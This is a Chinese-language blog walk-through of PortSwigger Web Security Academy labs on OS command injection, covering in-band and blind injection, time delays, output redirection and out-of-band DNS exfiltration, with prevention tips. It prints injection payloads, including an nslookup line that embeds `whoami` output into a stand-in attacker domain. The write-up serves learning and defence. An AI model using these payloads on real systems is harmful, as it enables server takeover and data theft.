> 原文链接: https://www.anquanke.com//post/id/245535 


# 梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之服务器端漏洞篇 - OS命令注入专题


                                阅读量   
                                **56801**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t01f90ce5977e44ab1e.png)](https://p4.ssl.qhimg.com/t01f90ce5977e44ab1e.png)



## 本系列介绍

> PortSwigger是信息安全从业者必备工具burpsuite的发行商，作为网络空间安全的领导者，他们为信息安全初学者提供了一个在线的网络安全学院(也称练兵场)，在讲解相关漏洞的同时还配套了相关的在线靶场供初学者练习，本系列旨在以梨子这个初学者视角出发对学习该学院内容及靶场练习进行全程记录并为其他初学者提供学习参考，希望能对初学者们有所帮助。



## 梨子有话说

> 梨子也算是Web安全初学者，所以本系列文章中难免出现各种各样的低级错误，还请各位见谅，梨子创作本系列文章的初衷是觉得现在大部分的材料对漏洞原理的讲解都是模棱两可的，很多初学者看了很久依然是一知半解的，故希望本系列能够帮助初学者快速地掌握漏洞原理。



## 服务器端漏洞篇介绍

> burp官方说他们建议初学者先看服务器漏洞篇，因为初学者只需要了解服务器端发生了什么就可以了



## 服务器端漏洞篇 – OS命令注入专题

### <a class="reference-link" name="%E4%BB%80%E4%B9%88%E6%98%AFOS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%9F"></a>什么是OS命令注入？

OS命令注入，顾名思义就是像Sql注入一样，将OS命令插入到某些地方被应用系统执行，这类漏洞的危害我相信不用我多说吧，严重的，可能从而控制整台服务器，好恐怖哦，那么接下来梨子就稍微讲一讲这类漏洞吧

### <a class="reference-link" name="%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"></a>执行任意命令

我们试想这样的场景，有一个商城应用程序中，可以通过一个URL查看是否还有库存，这个URL长这样<br>`https://insecure-website.com/stockStatus?productID=381&amp;storeID=29`<br>
我们看到它是通过参数productID和storeID来定位商品的，然后呢，后端是怎么执行查询功能的呢，这种方式梨子也是第一次见，就是开发将查询功能做成了一个脚本，然后通过GET请求的这两个参数去定位商品，返回库存<br>`stockreport.pl 381 29`<br>
从上面来看，我们再试想一下，如果这个应用程序并没有检查参数的值是否合规就将其简单粗暴地附加到脚本的参数中会不会发生类似Sql注入的情况呢，于是我们做出了这样的尝试，我们将参数productID的值替换成下面这个<br>`&amp; echo aiwefwlguh &amp;`<br>
然后我们看一下拼接以后是什么样子<br>`stockreport.pl &amp; echo aiwefwlguh &amp; 29`<br>
在命令行中与运算符(&amp;)可以在一条命令中执行多条命令，既然后端会执行这样一条命令，那么我们在前端就会收到这样的命令执行的结果

```
Error - productID was not provided
aiwefwlguh
29: command not found
```

我们看到虽然脚本因为缺失参数productID的值，但是并不影响执行其他命令，这就是一个简单的OS命令注入的例子

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E7%AE%80%E5%8D%95%E7%9A%84OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"></a>配套靶场：简单的OS命令注入

为了直观地看到OS命令注入的结果，我们选择在第二个参数中构造paylaod，首先我们先插入一个单引号(‘)，如果存在OS命令注入的话会因为参数值不规范而报错

[![](https://p5.ssl.qhimg.com/t01fe785eb8065bff55.png)](https://p5.ssl.qhimg.com/t01fe785eb8065bff55.png)

从上图来看，说明存在OS命令注入，然后我们就可以利用管道符(|)执行其他命令

[![](https://p2.ssl.qhimg.com/t01c1459045c5b17f69.png)](https://p2.ssl.qhimg.com/t01c1459045c5b17f69.png)

我们看到回显中是OS命令whoami的执行结果，说明我们成功发动了OS命令注入

### <a class="reference-link" name="%E6%9C%89%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4"></a>有用的命令

burp这里为初学者提供了一些比较常见的OS命令注入的命令，嘻嘻嘻，burp好贴心啊，真的是傻瓜式的教学，不管基础再差的初学者都可以听懂的哦

<th style="text-align: center;">命令用途</th><th style="text-align: center;">Linux</th><th style="text-align: center;">Windows</th>
|------
<td style="text-align: center;">当前用户名</td><td style="text-align: center;">whomai</td><td style="text-align: center;">whoami</td>
<td style="text-align: center;">操作系统版本</td><td style="text-align: center;">uname -a</td><td style="text-align: center;">ver</td>
<td style="text-align: center;">网络配置</td><td style="text-align: center;">ifconfig</td><td style="text-align: center;">ipconfig /all</td>
<td style="text-align: center;">网络连接</td><td style="text-align: center;">netstat -an</td><td style="text-align: center;">netstat -an</td>
<td style="text-align: center;">运行中的进程</td><td style="text-align: center;">ps -ef</td><td style="text-align: center;">tasklist</td>

### <a class="reference-link" name="OS%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8%E6%BC%8F%E6%B4%9E"></a>OS命令盲注漏洞

OS命令盲注，与Sql盲注相同，都是不会在回显中直接获取到OS命令注入结果的，需要结合其他技术获取OS命令注入结果，我们看一下这样一个场景，该应用程序存在一个反馈功能可以发送邮件到管理员那里，我们看到后端会执行这样的命令<br>`mail -s "This site is great" -aFrom:peter[@normal](https://github.com/normal)-user.net feedback[@vulnerable](https://github.com/vulnerable)-website.com`<br>
我们看到后端使用的是mail命令，这个命令不会在响应中回显任何东西，这就导致我们无法直接从响应回显中看到命令注入结果，这时候就需要利用其他技术获取了

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%BB%B6%E6%97%B6%E6%A3%80%E6%B5%8BOS%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8%E6%BC%8F%E6%B4%9E"></a>利用延时检测OS命令盲注漏洞

如果一个点存在不回显的OS命令注入，会出现虽然注入的OS命令可以被执行，但是我们接收不到结果，那么我们可以通过增加响应时间来判断是否执行了我们注入的语句，比如我们可以利用ping发一定数量的包来达到这种效果<br>`&amp; ping -c 10 127.0.0.1 &amp;`<br>
从上面我们看到我们发出了10个包，那么响应时间就会被延后大概10秒钟的时间，这样我们就能判断这个地方存在OS命令盲注漏洞

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8%E5%BB%B6%E6%97%B6%E6%A3%80%E6%B5%8BOS%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8%E6%BC%8F%E6%B4%9E"></a>配套靶场：利用延时检测OS命令盲注漏洞

就像我们刚才讲的，然后上手操作一下，基本没什么难度的

[![](https://p2.ssl.qhimg.com/t01a6dd38fab12676fa.png)](https://p2.ssl.qhimg.com/t01a6dd38fab12676fa.png)

我们看到我们的响应时间延后了10秒左右的样子，说明后端执行了我们注入的OS命令

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E8%BE%93%E5%87%BA%E8%A7%A6%E5%8F%91OS%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8"></a>利用重定向输出触发OS命令盲注

在了解到如何检测OS命令盲注漏洞以后，我们就要学习如何触发这个漏洞，这里介绍的方法是重定向输出，什么是重定向输出呢？就是将输出从其他的通道发出来，我们可以将OS命令盲注的结果写入到某个文件下，比如根目录的某个文件，然后我们就可以直接访问那个文件获取到结果了，比如我们注入这样的OS命令<br>`&amp; whoami &gt; /var/www/static/whoami.txt &amp;`<br>
如果应用程序存在OS命令盲注漏洞的话，则会在Web根目录下生成这样一个文件，里面保存着OS命令盲注的结果，这里有一个小知识给初学者讲一下哦，就是重定向输出符(&gt;)，正常情况会输出到命令行的嘛，但是利用这个操作符以后就可以将输出重定向到我们指定的地方，比如txt文件

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8%E9%87%8D%E5%AE%9A%E5%90%91%E8%BE%93%E5%87%BA%E8%A7%A6%E5%8F%91OS%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8"></a>配套靶场：利用重定向输出触发OS命令盲注

我们刚才已经讲的很详细了，大家手肯定痒痒了，那就稍微动动手玩玩

[![](https://p3.ssl.qhimg.com/t01830023e553e1703a.png)](https://p3.ssl.qhimg.com/t01830023e553e1703a.png)

然后我们访问一下对应的文件看一下有没有我们想要的东西

[![](https://p0.ssl.qhimg.com/t010f6b3c1e09089511.png)](https://p0.ssl.qhimg.com/t010f6b3c1e09089511.png)

好的，我们看到不仅能访问到那个文件，并且还能看到里面的内容，说明我们成功触发OS命令盲注

### <a class="reference-link" name="%E5%88%A9%E7%94%A8%E5%B8%A6%E5%A4%96%E6%8A%80%E6%9C%AF(OAST)%E6%A3%80%E6%B5%8B%E4%B8%8E%E8%A7%A6%E5%8F%91OS%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8"></a>利用带外技术(OAST)检测与触发OS命令盲注

之前我们在介绍Sql盲注的时候也介绍过带外技术，在OS命令盲注中同理，只不过是执行的位置不同罢了，比如我们注入这样OS命令<br>`&amp; nslookup kgji2ohoyw.web-attacker.com &amp;`<br>
上面这条命令只是利用带外技术检测OS命令盲注，当攻击者的服务器检测到有DNS流量即表示存在OS命令盲注漏洞

那么我们如何触发OS命令盲注呢？我们可以将OS命令盲注的结果拼接到所请求的域中，像这样的<br>`&amp; nslookup`whoami`.kgji2ohoyw.web-attacker.com &amp;`<br>
如果应用程序存在OS命令盲注的话，则我们可以在攻击者服务器接收到这样的DNS流量<br>`wwwuser.kgji2ohoyw.web-attacker.com`

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8%E5%B8%A6%E5%A4%96%E6%8A%80%E6%9C%AF%E6%A3%80%E6%B5%8BOS%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8"></a>配套靶场：利用带外技术检测OS命令盲注

通过对前面知识的学习，我们知道我们要找提交反馈的点，于是我们在HTTP History中找到了请求包，插入我们的payload

[![](https://p5.ssl.qhimg.com/t0166a7e01913186b42.png)](https://p5.ssl.qhimg.com/t0166a7e01913186b42.png)

然后我们来到collaborator看看有没有收到什么

[![](https://p0.ssl.qhimg.com/t01466f5758d620a261.png)](https://p0.ssl.qhimg.com/t01466f5758d620a261.png)

看，我们收到了DNS请求，说明我们成功触发了OS命令盲注

### <a class="reference-link" name="%E9%85%8D%E5%A5%97%E9%9D%B6%E5%9C%BA%EF%BC%9A%E5%88%A9%E7%94%A8%E5%B8%A6%E5%A4%96%E6%8A%80%E6%9C%AF%E8%A7%A6%E5%8F%91OS%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8"></a>配套靶场：利用带外技术触发OS命令盲注

步骤是差不多的，只不过是要稍微改一下payload，将要注入的OS命令用反引号(`)括起来

[![](https://p3.ssl.qhimg.com/t01eab2bd81441b9689.png)](https://p3.ssl.qhimg.com/t01eab2bd81441b9689.png)

然后我们就可以在我们的collaborator接收到夹带OS命令盲注结果的DNS请求了

[![](https://p2.ssl.qhimg.com/t01dea72126d02c4f07.png)](https://p2.ssl.qhimg.com/t01dea72126d02c4f07.png)

看，我们从而得知当前用户名是peter

### <a class="reference-link" name="OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"></a>OS命令注入方式

通过上面的学习，我们了解到注入的OS命令需要搭配命令分隔符使用，以下命令分隔符是Linux和Windows系统下通用的
- &amp;
- &amp;&amp;
- |
- ||
还有几个是只有Linux系统下的
- ;
- 换行符(0x0a or \n)
在Linux系统上，还可以使用反引号(`)或美元符号($)对注入命令进行内联执行，这样方便我们将结果拼接到带外地址中，有的时候我们的输入会被括在引号里面，不用慌，我们只需要在输入中利用引号闭合掉就可以继续注入我们的命令了

### <a class="reference-link" name="%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%9F"></a>如何防止OS命令注入攻击？

从前面讲的内容来看，导致OS命令注入的原因是我们直接将输入与命令前缀拼接执行，这样风险非常大的，如果我们不能接入一些API来实现执行命令，我们就需要实施严格的输入过滤，大概有以下几种方法
- 设置白名单并禁止白名单外的字符存在于输入中
- 验证输入数据类型是否符合要求
这里burp建议千万不要转义shell元字符，为了防止老手用骚操作绕过



## 总结

以上就是梨子带你刷burpsuite官方网络安全学院靶场(练兵场)系列之服务器端漏洞篇 – OS命令注入专题的全部内容啦，OS命令注入的危害还是非常严重的，如果检测到这类漏洞，就可以轻而易举地让服务器做任何你想要它做的事，希望大家能够大概了解OS命令注入的漏洞原理，大家有任何疑问欢迎在评论区讨论哦！
